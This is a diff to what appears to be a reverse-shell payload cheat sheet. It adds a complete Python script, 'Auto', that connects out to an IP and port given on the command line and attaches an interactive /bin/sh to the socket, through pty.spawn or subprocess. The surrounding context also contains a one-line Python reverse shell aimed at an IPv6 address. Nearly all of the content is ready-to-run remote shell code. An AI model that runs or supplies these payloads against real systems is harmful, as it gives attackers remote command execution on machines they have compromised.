@@ -160,6 +160,45 @@ IPv6 (No Spaces, Shortened)
 python -c 'a=__import__;c=a("socket");o=a("os").dup2;p=a("pty").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
 ```
 
+Auto
+```python
+import argparse
+import socket
+import os
+import pty
+import subprocess
+
+def remote_shell_socket(ip, port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, port))
+    return s
+
+def spawn_shell(ip, port, method):
+    s = remote_shell_socket(ip, port)
+    if method == "pty":
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        pty.spawn("/bin/sh")
+    elif method == "subprocess":
+        subprocess.call(["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
+    else:
+        print("Invalid method")
+
+def main():
+    parser = argparse.ArgumentParser(description='Remote shell automation')
+    parser.add_argument('-i' ,'--ip', required=True, help='Target IP address')
+    parser.add_argument('-p', '--port', required=True, type=int, help='Target port')
+    parser.add_argument('-m', '--method', choices=['pty', 'subprocess'], required=True, help='Method to spawn shell')
+    args = parser.parse_args()
+
+    spawn_shell(args.ip, args.port, args.method)
+
+if __name__ == '__main__':
+    main()
+```
+
+
 Windows only (Python2)
 
 ```powershell
